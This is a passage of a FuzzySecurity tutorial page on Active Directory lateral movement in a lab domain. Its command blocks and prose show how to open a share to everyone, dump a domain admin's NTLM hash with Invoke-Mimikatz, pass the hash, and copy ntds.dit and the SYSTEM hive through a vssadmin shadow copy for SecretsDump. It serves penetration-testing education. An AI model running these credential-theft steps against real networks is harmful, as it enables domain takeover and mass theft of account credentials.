+<p>&nbsp;</p><img src="images/Dom-25.png"><p>&nbsp;</p>
+
+<p><span style="color: #ffffff;"><strong>Impacket (PsExec) & incognito:</strong></span><br />
+Again we have some limitations here because of the pivot. To illustrate the technique I'll show how we can use incognito on the remote host as it is a bit user unfriendly (unlike Invoke-Mimikatz).</p>
+
+<p>&nbsp;</p><img src="images/Dom-26.png"><p>&nbsp;</p>
+
+<p>After running the command our shell hangs (sigh..). I played around with this for quite a bit and I found that without the "-c" (interactive mode) parameter the shell does not hang but the command does not execute correctly also if you don't group your commands in a bat file then it will only execute the first one before hanging. Just to be clear, this issue only happen when executing incognito through PsExec.<br /><br />
+
+Although it is quite an ugly solution, once we log back in to the machine we can see that our batch script ran correctly.</p>
+
+<p>&nbsp;</p><img src="images/Dom-27.png"><p>&nbsp;</p>
+
+<p>If anyone can figure out a more elegant way to execute the incognito command, definitely leave a comment!<br /><br />
+
+<span style="color: #ffffff;"><strong>File Transfers:</strong></span><br />
+Obviously I have gone a bit easy on myself, using the "put" command in Impacket's PsExec. Generally a good approach would be to download any files you may need onto the pivot box, you can use PowerShell's WebClient or something like bitsadmin. For some ideas, have a look at Parvez post <a href="https://www.greyhathacker.net/?p=500">here</a>. Once the files are in place you can simply create an unrestricted Windows share and mount that from the host behind the pivot. You can see some example syntax below.</p><br />
+
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style="color:#990066;"><strong># Create an unrestricted share.</strong></span>
+<span style='color:#ff0000;'>C:\Users\asenath.waite</span>> <span style='color:#2B8156;'>md C:\Users\asenath.waite\Desktop\test</span>
+
+<span style='color:#ff0000;'>C:\Users\asenath.waite</span>> <span style='color:#2B8156;'>echo Hello > C:\Users\asenath.waite\Desktop\test\test.txt</span>
+
+<span style='color:#ff0000;'>C:\Users\asenath.waite</span>> <span style='color:#2B8156;'>net share SomeShare=C:\Users\asenath.waite\Desktop\test /grant:everyone,full</span>
+SomeShare was shared successfully.
+
+<span style='color:#ff0000;'>C:\Users\asenath.waite</span>> <span style='color:#2B8156;'>net share</span>
+Share name   Resource                             Remark
+
+-------------------------------------------------------------------------------
+C$           C:\                                  Default share
+IPC$                                              Remote IPC
+ADMIN$       C:\Windows                           Remote Admin
+SomeShare    C:\Users\asenath.waite\Desktop\test
+
+The command completed successfully.
+
+<span style="color:#990066;"><strong># On the remote host simple mount the share.</strong></span>
+<span style='color:#ff0000;'>C:\Users\belial</span>> <span style='color:#2B8156;'>net use \\10.0.0.129\SomeShare</span>
+The command completed successfully.
+
+<span style='color:#ff0000;'>C:\Users\belial</span>> <span style='color:#2B8156;'>type \\10.0.0.129\SomeShare\test.txt</span>
+Hello
+
+<span style="color:#990066;"><strong># Unmount.</strong></span>
+<span style='color:#ff0000;'>C:\Users\belial</span>> <span style='color:#2B8156;'>net use \\10.0.0.129\SomeShare /delete</span>
+\\10.0.0.129\SomeShare was deleted successfully.
+
+<span style="color:#990066;"><strong># Clean up the share.</strong></span>
+<span style='color:#ff0000;'>C:\Users\asenath.waite</span>> <span style='color:#2B8156;'>net share C:\Users\asenath.waite\Desktop\test /delete /yes</span>
+Users have open files on SomeShare.  Continuing the operation will force the files closed.
+
+SomeShare was deleted successfully.
+
+<span style='color:#ff0000;'>C:\Users\asenath.waite</span>> <span style='color:#2B8156;'>rd /S /Q C:\Users\asenath.waite\Desktop\test</span>
+</pre><br />
+</div>
+
+<p>&nbsp;</p>
+<h2 class="title">Compromising Redrum-DC<span class="line"></span></h2>
+<p>At this point we have either found plain text credentials for REDHOOK\Administrator or created our own Doman Admin which means that compromising the DC will be exactly the same as the process we used for "Client 2". To save my fingers some typing I won't go over the entire scenario again, you can mix and match a number of technique which were shown previously. The two examples below are, again, doing something slightly different than the cases we saw earlier.<br /><br />
+
+<span style="color: #ffffff;"><strong>Socks Proxy & Impacket (WmiExec):</strong></span><br />
+Remember that socks proxy we set up earlier? We can actually proxify almost everything we need to compromise the domain. The one caveat is that this obviously requires us to set up a socks proxy on the pivot. Here we are using Impacket's WmiExec just to switch things up a bit.</p>
+
+<p>&nbsp;</p><img src="images/Dom-28.png"><p>&nbsp;</p>
+
+<p>Simple right? Just don't rely on it to much in case it is not an option!<br /><br />
+
+<span style="color: #ffffff;"><strong>Sysinternals (PsExec) & Invoke-Mimikatz:</strong></span><br />
+Time to complete our initial objective and get usable credentials for the REDHOOK\redhook.DA user account. This example is using Invoke-Mimikatz's ability to dump credentials on remote machines. Essentially, we get a shell on "Client 1" as REDHOOK\Administrator and then launch Mimikatz at the DC. We are assuming here that REDHOOK\redhook.DA has an active session on the box.</p>
+
+<p>&nbsp;</p><img src="images/Dom-29.png"><p>&nbsp;</p>
+
+<p>The reason that I'm only dumping hashes here is that, due to <a href="https://technet.microsoft.com/library/dn344918.aspx#BKMK_CredentialsProtectionManagement">enhanced protection features</a> on 2k12 R2/Windows 8.1+, we can't get clear text credentials for authenticated users. However, from the output we can see that we have managed to retrieve the REDHOOK\redhook.DA NTLM hash which will be more than enough to authenticate to other machines in the domain as that user.</p>
+
+<p>&nbsp;</p><img src="images/Dom-30.png"><p>&nbsp;</p>
+
+<p>Notice that we are just null padding the LM portion of the hash, it doesn't actually matter what we put there. We are certainly not restricted to Impacket here, Metasploit's PsExec will also work fine as will forging the NTLM hash of a command prompt using WCE or Mimikatz.</p>
+
+<h2 class="title">Pillaging NTDS<span class="line"></span></h2>
+<p>A lot of times extracting NTDS will be the final thing to do before rolling the Game Over credits. I highly recommend that you read Sean Metcalf post on doing this <a href="https://adsecurity.org/?p=2398">here</a> which shows a number of different techniques both with local shell access to the DC as well as remotely using WMI. In this section I will briefly show two ways we can achieve this.<br /><br />
+
+<span style="color: #ffffff;"><strong>Volume Shadow Copy (Classic-Mode):</strong></span><br />
+The most basic, living off the land, way to do this is to use vssadmin.</p><br />
+
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style='color:#ff0000;'>C:\</span>> <span style='color:#2B8156;'>whoami</span>
+redhook\redhook.da
+
+<span style="color:#990066;"><strong># Get the path to NTDS, it may not be in the C drive.</strong></span>
+<span style='color:#ff0000;'>C:\</span>> <span style='color:#2B8156;'>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters</span>
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
+    System Schema Version    REG_DWORD    0x45
+    Root Domain    REG_SZ    DC=RedHook,DC=local
+    Configuration NC    REG_SZ    CN=Configuration,DC=RedHook,DC=local
+    Machine DN Name    REG_SZ    CN=NTDS Settings,CN=REDRUM-DC,CN=Servers,CN=There-Be-Dragons,CN=Sites,CN=
+                                 Configuration,DC=RedHook,DC=local
+    DsaOptions    REG_SZ    1
+    IsClone    REG_DWORD    0x0
+    ServiceDll    REG_EXPAND_SZ    %systemroot%\system32\ntdsa.dll
+    DSA Working Directory    REG_SZ    C:\Windows\NTDS
+    DSA Database file    REG_SZ    C:\Windows\NTDS\ntds.dit
+    Database backup path    REG_SZ    C:\Windows\NTDS\dsadata.bak
+    Database log files path    REG_SZ    C:\Windows\NTDS
+    Hierarchy Table Recalculation interval (minutes)    REG_DWORD    0x2d0
+    Database logging/recovery    REG_SZ    ON
+    DS Drive Mappings    REG_MULTI_SZ    c:\=\\?\Volume{1c6c559b-3db6-11e5-80ba-806e6f6e6963}\
+    DSA Database Epoch    REG_DWORD    0x7983
+    Strict Replication Consistency    REG_DWORD    0x1
+    Schema Version    REG_DWORD    0x45
+    ldapserverintegrity    REG_DWORD    0x1
+    Global Catalog Promotion Complete    REG_DWORD    0x1
+    DSA Previous Restore Count    REG_DWORD    0x1
+
+<span style="color:#990066;"><strong># Create a shadow copy of C.</strong></span>
+<span style='color:#ff0000;'>C:\</span>> <span style='color:#2B8156;'>vssadmin create shadow /for=c:</span>
+vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+(C) Copyright 2001-2013 Microsoft Corp.
+
+Successfully created shadow copy for 'c:\'
+    Shadow Copy ID: {e0fd5b2d-b32d-4bba-89a2-efcf0b7b8fda}
+    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+
+<span style="color:#990066;"><strong># Copy out ntds and the system hive.</strong></span>
+<span style='color:#ff0000;'>C:\</span>> <span style='color:#2B8156;'>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit</span>
+        1 file(s) copied.
+        
+<span style='color:#ff0000;'>C:\</span>> <span style='color:#2B8156;'>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.hive</span>
+        1 file(s) copied.
+</pre><br />
+</div>
+
+<p>&nbsp;</p>
+<p>After getting the files back to the attacker's machine (many ways to do this, pick one hehe). We can simply use Impacket's SecretsDump locally and extract the contents. The output below is truncated for brevity.</p>
+
+<p>&nbsp;</p><img src="images/Dom-31.png"><p>&nbsp;</p>
+
+<p>Keep in mind that NTDS can literally contain thousands of user accounts and can be very large. Also, don't go outside your remit(!), dumping NTDS is likely to make Admins go absolutely ballistic!<br /><br />
+
+A very similar approach can be used with <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1">Invoke-NinjaCopy</a>, you can see an example of this in Sean Metcalf's post.<br /><br />
+
+<span style="color: #ffffff;"><strong>Socks Proxy & Impacket (SecretsDump) (Easy-Mode):</strong></span><br />
+Again, ridiculous as it seems, if we have a socks proxy set up on the pivot we can simply proxify SecretsDump and launch it against the DC using either plain text credentials or a hash!</p>
+
+<p>&nbsp;</p><img src="images/Dom-32.png">
+
+<h2 class="title">Final Thoughts<span class="line"></span></h2>
+<p>The main goal of this post was to showcase a number of different techniques available to the attacker. The various examples given can be combined in different ways as required by the situation. Hopefully this has given the reader some ideas on how to move around and pillage your way to DA!</p>
+
+<p style="text-align:center"><img src="images/Dom-33.jpg" alt=""/></p>
+
+</div>
+    </div>
+</div>
+      
+      <!-- End  -->
+    	</div>    
+    </div><!-- End page-columns -->
+     
+         <div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+             <span id="IDCommentsPostTitle" style="display:none"></span>
+           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
+         </div>
+     
+  </div><!-- <<< End Container >>> -->
+  
+  <footer>
+    <div class="container">
+    
+      
+      <div class="six columns"><span class="copyright">
+      © Copyright <a href="../index.html">FuzzySecurity</a></span></div>
+      
+      <div class="six columns">
+        
+          <p><a href="../index.html">Home</a> |
+          <a href="../tutorials.html">Tutorials</a> |
+          <a href="../coding.html">Scripting</a> |
+          <a href="../exploits.html">Exploits</a> |
+          <a href="../links.html">Links</a> |
+          <a href="../contact.html">Contact</a></p>
+        
+      </div>
+    
+    </div><!-- End container -->
+  </footer><!-- <<< End Footer >>> -->
+  
+  </div><!-- End wrap -->
+  
+  <!-- Start Style Switcher -->
+  <div class="switcher"></div>
+  <!-- End Style Switcher -->
+    
+</body>
+</html>
